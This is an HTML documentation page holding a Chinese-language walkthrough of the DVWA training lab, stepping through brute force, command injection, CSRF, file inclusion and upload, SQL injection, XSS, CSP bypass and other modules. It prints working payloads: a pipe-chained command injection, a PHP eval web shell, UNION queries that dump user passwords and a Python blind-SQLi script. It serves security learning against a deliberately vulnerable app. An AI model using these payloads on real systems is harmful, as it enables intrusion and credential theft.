@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="zh" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        
+        <link rel="shortcut icon" href="../img/favicon.ico">
+        <title>DVWA WriteUp - Forlight's Docs</title>
+        <link href="../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../css/brands.min.css" rel="stylesheet">
+        <link href="../css/solid.min.css" rel="stylesheet">
+        <link href="../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../css/base.css" rel="stylesheet">
+        <link id="hljs-light" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/color-brewer.min.css" >
+        <link id="hljs-dark" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github-dark.min.css" disabled>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+        <script>hljs.highlightAll();</script> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-dark">
+            <div class="container">
+                <a class="navbar-brand" href="..">Forlight's Docs</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href=".." class="nav-link">Home</a>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" role="button" data-bs-toggle="dropdown"  aria-expanded="false">最近</a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../MySQL/" class="dropdown-item">数据库</a>
+</li>
+                                </ul>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a href="#" class="nav-link dropdown-toggle active" aria-current="page" role="button" data-bs-toggle="dropdown"  aria-expanded="false">归档</a>
+                                <ul class="dropdown-menu">
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">计算机系统</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../linux/" class="dropdown-item">Linux系统</a>
+</li>
+            
+<li>
+    <a href="../HTTP/" class="dropdown-item">HTTP协议</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">数通网络</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../IGMP/" class="dropdown-item">IGMP</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">网络安全</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../SQL%E6%B3%A8%E5%85%A5/" class="dropdown-item">SQLI</a>
+</li>
+            
+<li>
+    <a href="../XSS%E6%B3%A8%E5%85%A5/" class="dropdown-item">XSS</a>
+</li>
+            
+<li>
+    <a href="../msf%E6%9E%84%E5%BB%BA%E6%9C%A8%E9%A9%AC/" class="dropdown-item">MSF</a>
+</li>
+            
+<li>
+    <a href="../CTFHub%20WriteUp/" class="dropdown-item">CTFHub WriteUp</a>
+</li>
+            
+<li>
+    <a href="./" class="dropdown-item active" aria-current="page">DVWA WriteUp</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">软件</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../VMware%20Pro%E5%AE%89%E8%A3%85/" class="dropdown-item">VMware Pro安装</a>
+</li>
+            
+<li>
+    <a href="../typora%E5%AE%89%E8%A3%85%E4%B8%8E%E7%A0%B4%E8%A7%A3/" class="dropdown-item">typora安装与破解</a>
+</li>
+    </ul>
+  </li>
+                                </ul>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../about/" class="nav-link">About</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li class="nav-item">
+                                <a rel="prev" href="../CTFHub%20WriteUp/" class="nav-link">
+                                    <i class="fa fa-arrow-left"></i> Previous
+                                </a>
+                            </li>
+                            <li class="nav-item">
+                                <a rel="next" href="../VMware%20Pro%E5%AE%89%E8%A3%85/" class="nav-link">
+                                    Next <i class="fa fa-arrow-right"></i>
+                                </a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="https://github.com/edit/master/docs/DVWA WriteUp.md" class="nav-link"><i class="fa-brands fa-github"></i> Edit on GitHub</a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-bs-level="1"><a href="#dvwa-writeup" class="nav-link">DVWA WriteUp</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="dvwa-writeup">DVWA WriteUp</h1>
+<h3 id="brute-force">Brute Force</h3>
+<p>通过burpsuite内嵌浏览器打开dvwa靶场，开启拦截。</p>
+<p>随机输入账号密码并提交。</p>
+<p><img alt="image-20260712225657929" src="../img/image-20260712225657929.png" /></p>
+<p>回到bp，将拦截到的请求右键发送到攻击器。</p>
+<p>来到攻击器，将username和password对应上传的参数“<strong>admin</strong>”和“<strong>password</strong>”添加payload，再将攻击模式改成<strong>集群炸弹模式</strong>。</p>
+<p><img alt="image-20260712230015553" src="../img/image-20260712230015553.png" /></p>
+<p>payload选择提前创建好的字典，开始攻击。</p>
+<p><img alt="image-20260712230155141" src="../img/image-20260712230155141.png" /></p>
+<p>长度不同的这个响应就是正确账密。</p>
+<p><img alt="image-20260712230325825" src="../img/image-20260712230325825.png" /></p>
+<p>验证正确。</p>
+<hr />
+<h3 id="command-injection">Command Injection</h3>
+<p>是一个ping功能</p>
+<p><img alt="image-20260724102138042" src="../img/image-20260724102138042.png" /></p>
+<p>命令注入，直接尝试连接符，跟上我们其他的命令</p>
+<pre><code>127.0.0.1 | ls
+</code></pre>
+<p><img alt="image-20260724102647117" src="../img/image-20260724102647117.png" /></p>
+<p>注入成功</p>
+<h4 id="_1">命令连接符</h4>
+<p><strong>a &amp;&amp; b</strong> ：代表首先执行前者命令a再执行后命令b，但是前提条件是命令a执行正确才会执行命令b，在a执行失败的情况下不会执行b命令。所以又被称为短路运算符。
+（前面的命令执行成功后，它后面的命令才被执行）</p>
+<p><strong>a &amp; b</strong>：代表首先执行命令a再执行命令b，如果a执行失败，还是会继续执行命令b。也就是说命令b的执行不会受到命令a的干扰。
+（表示简单的拼接，A命令语句和B命令语句没有制约关系）</p>
+<p><strong>a || b</strong>：代表首先执行a命令再执行b命令，如果a命令执行成功，就不会执行b命令，相反，如果a命令执行不成功，就会执行b命令。
+（前面的命令执行失败，它后面的命令才被执行）</p>
+<p><strong>a | b</strong>：代表首先执行a命令，再执行b命令，不管a命令成功与否，都会去执行b命令。
+（当第一条命令失败时，它仍然会执行第二条命令，表示A命令语句的输出，作为B命令语句的输入执行。）</p>
+<p><strong>a ; b</strong>：用于将多个命令连接在一起，按顺序执行每个命令，无论前一个命令的执行结果如何。</p>
+<p>原文链接：https://blog.csdn.net/weixin_43847838/article/details/111602811</p>
+<hr />
+<h3 id="csrf">CSRF</h3>
+<p>这是个更改登录密码的页面，新密码-&gt;确认密码-&gt;修改-&gt;修改成功</p>
+<p><img alt="image-20260724110417084" src="../img/image-20260724110417084.png" /></p>
+<p>能够注意到url栏是</p>
+<pre><code>http://localhost/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#
+</code></pre>
+<p><strong>password_new</strong>和<strong>password_conf</strong>的参数内容<code>password</code>就是我输入的新密码</p>
+<p>说明我们输入的密码会在url进行传参执行</p>
+<p>那么修改url参数直接访问</p>
+<pre><code>http://localhost/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#
+</code></pre>
+<p><img alt="image-20260724111150662" src="../img/image-20260724111150662.png" /></p>
+<p>修改成功</p>
+<hr />
+<h3 id="file-inclusion">File Inclusion</h3>
+<p>有三个链接可以点击</p>
+<p><img alt="image-20260724195333185" src="../img/image-20260724195333185.png" /></p>
+<p>分别点击，发现url栏参数跟着变化</p>
+<p><img alt="image-20260724195843926" src="../img/image-20260724195843926.png" /></p>
+<p>尝试修改参数</p>
+<p><img alt="image-20260724195956344" src="../img/image-20260724195956344.png" /></p>
+<p>远程文件包含</p>
+<p><img alt="image-20260724200109498" src="../img/image-20260724200109498.png" /></p>
+<p>本地文件包含</p>
+<p><img alt="image-20260724201337449" src="../img/image-20260724201337449.png" /></p>
+<hr />
+<h3 id="file-upload">File Upload</h3>
+<p>直接上传一句话木马123.php，内容是</p>
+<pre><code>&lt;?php @eval($_POST['123']);?&gt;
+</code></pre>
+<p><img alt="image-20260725110726087" src="../img/image-20260725110726087.png" /></p>
+<p>打开文件验证是否成功</p>
+<p><img alt="image-20260725110919592" src="../img/image-20260725110919592.png" /></p>
+<p>能打开说明上传成功，用蚁剑连接</p>
+<p><img alt="image-20260725111116101" src="../img/image-20260725111116101.png" /></p>
+<hr />
+<h3 id="insecure-captcha">Insecure CAPTCHA</h3>
+<p>CAPTCHA（全自动区分计算机和人类的图灵测试）的核心目的不是验证“你是谁”，而是验证<strong>“你是不是人”</strong>。它的实现机制主要依赖人类与机器在感知和认知上的差异。</p>
+<p>直接修改密码</p>
+<p><img alt="image-20260725115246024" src="../img/image-20260725115246024.png" /></p>
+<p>显示验证码不正确</p>
+<p>查看源码</p>
+<pre><code>&lt;?phpif( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '1' ) ) {    // Hide the CAPTCHA form    $hide_form = true;    // Get input    $pass_new  = $_POST[ 'password_new' ];    $pass_conf = $_POST[ 'password_conf' ];    // Check CAPTCHA from 3rd party    $resp = recaptcha_check_answer(        $_DVWA[ 'recaptcha_private_key'],        $_POST['g-recaptcha-response']    );    // Did the CAPTCHA fail?    if( !$resp ) {        // What happens when the CAPTCHA was entered incorrectly        $html     .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;;        $hide_form = false;        return;    }    else {        // CAPTCHA was correct. Do both new passwords match?        if( $pass_new == $pass_conf ) {            // Show next stage for the user            echo &quot;                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;{$pass_new}\&quot; /&gt;                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;{$pass_conf}\&quot; /&gt;                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;                &lt;/form&gt;&quot;;        }        else {            // Both new passwords do not match.            $html     .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;;            $hide_form = false;        }    }}if( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '2' ) ) {    // Hide the CAPTCHA form    $hide_form = true;    // Get input    $pass_new  = $_POST[ 'password_new' ];    $pass_conf = $_POST[ 'password_conf' ];    // Check to see if both password match    if( $pass_new == $pass_conf ) {        // They do!        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));        $pass_new = md5( $pass_new );        // Update database        $insert = &quot;UPDATE `users` SET password = '$pass_new' WHERE user = '&quot; . dvwaCurrentUser() . &quot;';&quot;;        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );        // Feedback for the end user        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;    }    else {        // Issue with the passwords matching        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;        $hide_form = false;    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);}?&gt;
+</code></pre>
+<p>发现后端通过检查change和step来判断验证是否通过</p>
+<p>用bp抓包，Repeater中修改step=2</p>
+<p><img alt="image-20260725150154007" src="../img/image-20260725150154007.png" /></p>
+<hr />
+<h3 id="sql-injection">SQL Injection</h3>
+<p>尝试输入<code>1'</code>，可以看出是单引号字符型注入</p>
+<p><img alt="image-20260725175009046" src="../img/image-20260725175009046.png" /></p>
+<p>再输入<code>1'-- -</code>，正常显示</p>
+<p><img alt="image-20260725175155590" src="../img/image-20260725175155590.png" /></p>
+<pre><code>1' order by 1-- -
+</code></pre>
+<p>到3时报错，说明表的字段数是2</p>
+<p><img alt="image-20260725175556776" src="../img/image-20260725175556776.png" /></p>
+<p>直接构造</p>
+<pre><code>-1' union select 1,group_concat(schema_name) from information_schema.schemata-- -
+</code></pre>
+<p><img alt="image-20260725181818331" src="../img/image-20260725181818331.png" /></p>
+<pre><code>-1' union select 1,group_concat(table_name) from information_schema.tables -- -
+</code></pre>
+<p><img alt="image-20260725182244340" src="../img/image-20260725182244340.png" /></p>
+<pre><code>-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' -- -
+</code></pre>
+<p><img alt="image-20260725182414181" src="../img/image-20260725182414181.png" /></p>
+<pre><code>-1' union select 1,group_concat(user,0x3a,password) from users-- -
+</code></pre>
+<p><img alt="image-20260725182612422" src="../img/image-20260725182612422.png" /></p>
+<hr />
+<h3 id="sql-injection-blind">SQL Injection (Blind)</h3>
+<p>输入1，提示数据库中存在</p>
+<p><img alt="image-20260725220348703" src="../img/image-20260725220348703.png" /></p>
+<p>输入999，提示不存在</p>
+<p><img alt="image-20260725220948021" src="../img/image-20260725220948021.png" /></p>
+<p>用python构建自动化脚本，通过是否返回exists判断</p>
+<pre><code class="language-python">import requests
+
+url = &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/&quot;
+cookies = {&quot;PHPSESSID&quot;: &quot;your_session_id&quot;, &quot;security&quot;: &quot;low&quot;}
+
+db_name = &quot;&quot;
+for i in range(1, 20):
+    for c in &quot;abcdefghijklmnopqrstuvwxyz0123456789_&quot;:
+        payload = f&quot;1' and substr(database(),{i},1)='{c}'-- -&quot;
+        r = requests.get(url, params={&quot;id&quot;: payload, &quot;Submit&quot;: &quot;Submit&quot;}, cookies=cookies)
+        if &quot;exists&quot; in r.text:
+            db_name += c
+            print(f&quot;[+] {db_name}&quot;)
+            break
+    else:
+        break
+
+print(f&quot;[*] Database: {db_name}&quot;)
+</code></pre>
+<hr />
+<h3 id="weak-session-ids">Weak Session IDs</h3>
+<p>每点击generate按钮后，这个网页会生成一个叫做dvwaSession的新cookie</p>
+<p>直接bp抓包</p>
+<p><img alt="image-20260725221926254" src="../img/image-20260725221926254.png" /></p>
+<p>发现Session ID就是+1递增的</p>
+<p>直接记录下当前cookie值</p>
+<pre><code>dvwaSession=1; PHPSESSID=gulkjk1253f3hqrt5b5qqj4tg6; security=low
+</code></pre>
+<p>清空浏览器中dvwa的缓存</p>
+<p>重新访问该页面</p>
+<p>跳转到登陆页面</p>
+<p><img alt="image-20260725224645795" src="../img/image-20260725224645795.png" /></p>
+<p>hacker bar填写url和cookie，excute</p>
+<p><img alt="image-20260725224804140" src="../img/image-20260725224804140.png" /></p>
+<p>不输入账号密码情况下成功登录</p>
+<hr />
+<h3 id="xssdom">XSS(DOM)</h3>
+<p>可以选择输入，发现可能是url传参default</p>
+<p><img alt="image-20260726152948347" src="../img/image-20260726152948347.png" /></p>
+<p>尝试<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<pre><code>http://dvwa:8898/vulnerabilities/xss_d/?default=&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p><img alt="image-20260726153158241" src="../img/image-20260726153158241.png" /></p>
+<p>存在XSS注入</p>
+<hr />
+<h3 id="xssreflected">XSS(Reflected)</h3>
+<p>输入1，发现可能是url传参name</p>
+<p><img alt="image-20260726153605711" src="../img/image-20260726153605711.png" /></p>
+<pre><code>http://dvwa:8898/vulnerabilities/xss_r/?name=&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p><img alt="image-20260726153748406" src="../img/image-20260726153748406.png" /></p>
+<hr />
+<h3 id="xssstored">XSS(Stored)</h3>
+<p>尝试输入1，1；发现内容被记录下来</p>
+<p><img alt="image-20260726155444352" src="../img/image-20260726155444352.png" /></p>
+<p>尝试1，<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p><img alt="image-20260726155713834" src="../img/image-20260726155713834.png" /></p>
+<p>脚本成功运行</p>
+<p>刷新页面</p>
+<p><img alt="image-20260726155809831" src="../img/image-20260726155809831.png" /></p>
+<p>再次弹窗，证明是存储型XSS</p>
+<hr />
+<h3 id="csp-bypass">CSP  Bypass</h3>
+<p>提示查看CSP白名单</p>
+<p>直接bp抓包</p>
+<p><img alt="image-20260726161733083" src="../img/image-20260726161733083.png" /></p>
+<p>注意到回包中Content-Security-Policy字段</p>
+<p>访问其中一条网址，是个可粘贴文本网站，粘贴<code>alert(1)</code></p>
+<p><img alt="image-20260726165323257" src="../img/image-20260726165323257.png" /></p>
+<p>dvwa中输入刚刚上传脚本可下载链接</p>
+<p><img alt="image-20260726165211621" src="../img/image-20260726165211621.png" /></p>
+<p><img alt="image-20260726165228962" src="../img/image-20260726165228962.png" /></p>
+<hr />
+<h3 id="javascript-attacks">JavaScript Attacks</h3>
+<p>提示输入success通关</p>
+<p><img alt="image-20260726171924868" src="../img/image-20260726171924868.png" /></p>
+<p>提示token错误</p>
+<p><img alt="image-20260726171950751" src="../img/image-20260726171950751.png" /></p>
+<p>bp抓包</p>
+<p><img alt="image-20260726172023098" src="../img/image-20260726172023098.png" /></p>
+<p><img alt="image-20260726172103157" src="../img/image-20260726172103157.png" /></p>
+<p>发现用的都是一个token值</p>
+<p>查看页面源码，找到token生成部分</p>
+<p><img alt="image-20260726173351936" src="../img/image-20260726173351936.png" /></p>
+<p>分析发现</p>
+<p>页面加载时，<code>generate_token()</code> 函数会立即运行。它会把输入框 <code>phrase</code>，默认值是即<code>ChangeMe</code> 先做 ROT13 编码，再计算其 MD5 值。计算出的 MD5 值会自动填入隐藏域 <code>token</code> 中。</p>
+<p>提交时始终是ChangeMe对应的token，和你输入的success，导致不正确。</p>
+<p>那么就先输入success，再打开控制台执行一遍<code>generate_token()</code>，重新生成success对应的token，提交。</p>
+<p><img alt="image-20260726174158756" src="../img/image-20260726174158756.png" /></p>
+<p><img alt="image-20260726174221449" src="../img/image-20260726174221449.png" /></p>
+<hr />
+<h3 id="authorisation-bypass">Authorisation Bypass</h3>
+<p>这个页面只有<code>admin</code>账户能够访问并操作，让我们使用<code>gordonb / abc123</code>尝试绕过</p>
+<p>记住当前url路径</p>
+<p><img alt="image-20260728094420515" src="../img/image-20260728094420515.png" /></p>
+<p>退出登录，用普通账户<code>gordonb / abc123</code>重新登录</p>
+<p>导航栏没有<strong>Authorisation Bypass</strong>了</p>
+<p><img alt="image-20260728094102069" src="../img/image-20260728094102069.png" /></p>
+<p>url加上刚刚保存的目录<code>/authbypass/</code></p>
+<p>成功绕过</p>
+<p><img alt="image-20260728094028771" src="../img/image-20260728094028771.png" /></p>
+<hr />
+<h3 id="open-http-redirect">Open HTTP Redirect</h3>
+<p>点击两个链接，发现url有传参点</p>
+<p><img alt="image-20260728122526735" src="../img/image-20260728122526735.png" /></p>
+<p>定位源码，发现重定向</p>
+<pre><code>&lt;a href=&quot;source/low.php?redirect=info.php?id=1&quot;&gt;Quote 1&lt;/a&gt;
+</code></pre>
+<p><img alt="image-20260728122343616" src="../img/image-20260728122343616.png" /></p>
+<p>构造url</p>
+<pre><code>source/low.php?redirect=http://www.baidu.com
+</code></pre>
+<p><img alt="image-20260728122725876" src="../img/image-20260728122725876.png" /></p>
+<p>成功重定向指定网站</p>
+<hr />
+<h3 id="cryptography">Cryptography</h3>
+<p>将密文解密成明文密码，填入password栏</p>
+<p><img alt="image-20260728202909922" src="../img/image-20260728202909922.png" /></p>
+<hr /></div>
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../js/base.js"></script>
+        <script src="../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
